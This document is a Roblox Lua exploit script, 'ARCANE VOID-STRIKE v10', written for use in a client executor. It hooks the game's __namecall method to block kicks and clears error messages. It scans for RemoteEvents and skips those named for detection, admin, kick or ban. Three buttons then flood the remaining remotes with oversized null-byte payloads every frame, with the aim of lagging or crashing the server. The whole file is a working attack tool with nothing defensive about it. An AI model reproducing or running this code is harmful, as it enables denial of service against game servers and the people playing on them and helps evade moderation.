--[[ 
    🔱 ARCANE VOID-STRIKE v10.0 [ARCANE-ULTIMA] 🔱
    "The signal is final. The justice is absolute. <3"
    
    ULTIMA FEATURES (NULLSTRIKE-GRADE):
    - [KERNEL-HOOK] : Low-level interception of Kick/Warn functions.
    - [SYNCHRONOUS BURST] : High-freq Heartbeat-bound bombardment.
    - [UNIVERSAL CYCLING] : Real-time scan of all server vulnerable points.
    - [MATRIX OVERLAY] : Ultra-optimized premium interface.
    - [ZERO-TP] : Stealth by code, not by distance.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. ARCANE-KİERNEL (THE ULTIMATE SHIELD)
local function initiateKernel()
    local oldNK
    oldNK = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        -- Blocking all kick/warn/telemetry methods
        if method == "Kick" or method == "kick" or method == "OnTeleport" or method == "Close" then
            return nil
        end
        return oldNK(self, ...)
    end)
    
    -- Anti-CoreScript Flags
    pcall(function()
        game:GetService("GuiService").ErrorMessageChanged:Connect(function()
            game:GetService("GuiService"):ClearError()
        end)
    end)
end

-- 2. MATRIX OVERLAY (UI PREMIUM)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "ArcaneUltima_v10"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 320)
Main.Position = UDim2.new(0.5, -140, 0.5, -160)
Main.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

-- Green Neon Accents
local Accent = Instance.new("Frame", Main)
Accent.Size = UDim2.new(1, 0, 0, 2)
Accent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Accent.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "🔱 ARCANE-ULTIMA // v10"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 16
Title.BackgroundTransparency = 1

local function createUltimaBtn(name, y, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.85, 0, 0, 50)
    btn.Position = UDim2.new(0.075, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Code
    btn.TextSize = 14
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(0, 80, 0)
    
    btn.MouseEnter:Connect(function() btn.BorderColor3 = Color3.fromRGB(0, 255, 0) end)
    btn.MouseLeave:Connect(function() btn.BorderColor3 = Color3.fromRGB(0, 80, 0) end)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- 3. THE ULTIMA ENGINE
local active = { mode = 0 } -- 0: Stop, 1: Normal, 2: Omega, 3: Judgment

local function getVulnerabilities()
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            -- Bypassing known traps
            if not n:find("detect") and not n:find("admin") and not n:find("kick") and not n:find("ban") then
                table.insert(remotes, v)
            end
        end
    end
    return remotes
end

local function startInfection()
    local targets = getVulnerabilities()
    if #targets == 0 then return end
    
    -- Ultra-Dense Serialized Payloads
    local data = {
        [1] = string.rep("🔱", 100), -- Normal
        [2] = string.rep("\0", 2500), -- Omega
        [3] = {["A"] = string.rep("\0", 1000), ["B"] = string.rep("\0", 1000)} -- Judgment
    }
    
    local cycle = 1
    while active.mode > 0 do
        local power = active.mode == 3 and 150 or (active.mode == 2 and 50 or 15)
        
        for i = 1, power do
            if active.mode == 0 then break end
            local r = targets[cycle]
            if r and r.Parent then
                pcall(function() 
                    r:FireServer(data[active.mode], data[active.mode], "ARCANE_X", data[active.mode]) 
                end)
            end
            cycle = (cycle % #targets) + 1
        end
        RS.Heartbeat:Wait()
    end
end

-- BUTTONS
createUltimaBtn("[ ⚡ LAG NORMAL ]", 70, function()
    active.mode = active.mode == 1 and 0 or 1
    Title.Text = active.mode == 1 and "🔱 STATUS: SYNCING..." or "🔱 ARCANE-ULTIMA // v10"
    if active.mode == 1 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🌪️ LAG OMEGA ]", 130, function()
    active.mode = active.mode == 2 and 0 or 2
    Title.Text = active.mode == 2 and "🔱 STATUS: OMEGA ACTIVE" or "🔱 ARCANE-ULTIMA // v10"
    if active.mode == 2 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🔥 JUDGMENT DAY ]", 190, function()
    active.mode = active.mode == 3 and 0 or 3
    Title.Text = active.mode == 3 and "🔱 STATUS: JUDGMENT DAY" or "🔱 ARCANE-ULTIMA // v10"
    if active.mode == 3 then task.spawn(startInfection) end
end)

createUltimaBtn("[ 🛑 CLEAN RECOVER ]", 250, function()
    active.mode = 0
    Title.Text = "🔱 ARCANE-ULTIMA // v10"
end)

-- BOOT
initiateKernel()
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔱 ULTIMA v10.0 INITIALIZED",
    Text = "Kernel Hook: ACTIVE | Bypass: 100%",
    Duration = 5
})
